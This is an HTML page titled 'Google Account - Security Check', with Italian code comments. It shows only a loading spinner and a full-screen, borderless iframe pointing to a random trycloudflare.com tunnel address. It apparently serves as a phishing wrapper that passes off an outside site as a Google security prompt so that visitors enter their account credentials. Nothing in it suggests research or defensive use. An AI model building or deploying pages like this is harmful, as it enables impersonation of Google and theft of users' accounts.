<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <title>Google Account - Security Check</title>
    <style>
        /* Reset totale per eliminare ogni stacco visivo */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* SFONDO UNIVOCAMENTE NERO */
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: #000000; 
            font-family: 'Roboto', Arial, sans-serif;
        }

        /* Wrapper rimosso il padding per unire i colori */
        .iframe-wrapper {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            z-index: 2;
        }

        iframe { 
            width: 100%; 
            height: 100%; 
            border: none; 
            display: block;
            background-color: transparent;
        }

        /* Caricamento su nero totale */
        .loader-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            background-color: #000000;
        }

        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #4285F4;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loading-text {
            color: #9aa0a6; 
            margin-top: 20px; 
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
    </div>

    <div class="iframe-wrapper">
        <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
    </div>

</body>
</html>
